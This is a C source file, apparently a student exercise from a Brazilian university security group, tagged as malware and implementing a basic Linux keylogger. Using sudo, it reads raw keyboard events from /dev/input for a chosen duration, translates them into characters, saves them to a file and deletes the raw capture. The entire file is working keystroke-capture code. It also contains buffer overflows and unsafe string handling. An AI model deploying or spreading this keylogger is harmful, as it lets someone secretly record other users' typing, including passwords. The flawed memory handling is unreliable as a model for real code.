/*
 * Universidade Federal do Rio de Janeiro
 * PS-GRIS
 * Autor: Pedro Jullian Medina Torres Graca
 * TAG:	Malware
 * Aplicador: José
 * Descricao: Keylogger básico para linux
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "keylogger.h"

int
main (int argc , char *argv[])
{
	char time [3], saida[1], *command;
	FILE *arqTraducao , *code;
	size_t lidos;
	byte buffer [COMPRIMENTO_BUFFER];
	tipoErros verificador;
	
	printf ("\nNAO ESQUEÇA QUE ESSE PROGRAMA PRECISA DE SUDO PRA FUNCIONAR\n");
	if (argc!=NUMERO_ARGUMENTOS)
	{
		printf ("\nUso: %s <numero-tempo-de-captura> <[h|m|s]-tempo-em-hora-minuto-segundo> <nome-do-arquivo-que-vc-deseja-colocar-os-dados>\n",argv[0]);
		printf ("exemplo:\n\t%s 3 s a.txt\n",argv[0]);
		exit (numeroArgumentosInvalido);		
	}

	if ((strlen(argv[1])>2)||((strlen(argv[2])>1)))
	{
		printf ("\nUso: %s <numero-tempo-de-captura> <[h|m|s]-tempo-em-hora-minuto-segundo> <nome-do-arquivo-que-vc-deseja-colocar-os-dados>\n",argv[0]);
		printf ("exemplo:\n\t%s 3 s a.txt\n",argv[0]);
		exit (naoEhChar);
	}
	if((argv[2][0]=='s')||(argv[2][0]=='h')||(argv[2][0]=='m'));
	else
	{
		printf ("\nUso: %s <numero-tempo-de-captura> <[h|m|s]-tempo-em-hora-minuto-segundo> <nome-do-arquivo-que-vc-deseja-colocar-os-dados>\n",argv[0]);
		printf ("exemplo:\n\t%s 3 s a.txt\n",argv[0]);
		exit (naoEhHMS);
	}
	if ((argv[1][0]<'0')||(argv[1][0]>'9'))
	{
		printf ("\nUso: %s <numero-tempo-de-captura> <[h|m|s]-tempo-em-hora-minuto-segundo> <nome-do-arquivo-que-vc-deseja-colocar-os-dados>\n",argv[0]);
		printf ("exemplo:\n\t%s 3 s a.txt\n",argv[0]);
		exit (naoEhNumero);
	}
	if (strlen(argv[1])==2)
		if ((argv[1][1]<'0')||(argv[1][1]>'9'))
	{
		printf ("\nUso: %s <numero-tempo-de-captura> <[h|m|s]-tempo-em-hora-minuto-segundo> <nome-do-arquivo-que-vc-deseja-colocar-os-dados>\n",argv[0]);
		printf ("exemplo:\n\t%s 3 s a.txt\n",argv[0]);
		exit (naoEhNumero);
		
	}
	
	strcpy(time,argv[1]);
	strcat(time,argv[2]);
	
	printf ("\nseu tempo e: %s\n", time);
	
	command = malloc (sizeof (command)*(15+16+strlen(time)));

	strcat (command,"sudo timeout ");
	strcat (command,time);
	strcat (command," cat /dev/input/by-path/*-kbd > ./.hex");
	
	system (command);
	/*preciso tratar para caso nao tenha permissao*/
	
	/*cria arquivo hex das teclas digitadas*/
	
	if (!(code = fopen (".hex","r")))
	{
		printf ("\nNão foi possivel abrir o arquivo \"%s\"", ".hex");
    printf ("\nErro (#%i): %s\n", naoConseguindoAbrirArquivo, "arquivo NULL");
    exit(naoConseguindoAbrirArquivo);
	}/*abre arquivo que precisa de correção*/
	
	/*seria bom tratar o argv[3] obrigando ele a ser apenas letras e pontos e sempre terminar com .txt*/
	
	if (!(arqTraducao= fopen (argv[3], "w")))
	{
		printf ("\nNão foi possivel construir o arquivo \"%s\"", argv[3]);
    printf ("\nErro (#%i): %s\n", naoConseguindoAbrirArquivo, "arquivo NULL");
    exit(naoConseguindoAbrirArquivo);
	}/*abre arquivo que recebera a correcao*/
	
	/*aqui irei ler o .hex, traduzir e passar pro arquivo argv[1]*/
	while ((lidos=fread (buffer, COMPRIMENTO_BUFFER,1,code)))
	{
		if ((verificador=tradutor (buffer,&saida[0]))==ok)
		{
			saida[1]=EOS;
			fputs(saida,arqTraducao);
		}
		else
		{
			if (verificador==naoAchado);
			else
			{
				printf ("Erro(#%i): erro ao tentar traduzir algum valor\n",verificador);
			}
		}
	}/*loop de ler .hex e colocar no nome pedido*/
	fputs("\n",arqTraducao);

	if (fclose (code)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", "a.txt");
		printf ("\nErro (#%i): %s", naoConseguindofecharArquivo, "desconhecido\n");
		exit (naoConseguindofecharArquivo);
	}/* fecha*/

	system ("sudo rm -f .hex"); /*apaga arquivo que foi traduzido*/

	if (fclose (arqTraducao)!=0)
	{
		printf ("\nNao foi possivel fechar o arquivo \"%s\"", argv[3]);
		printf ("\nErro (#%i): %s", naoConseguindofecharArquivo, "desconhecido\n");
		exit (naoConseguindofecharArquivo);
	}

	return ok;
}
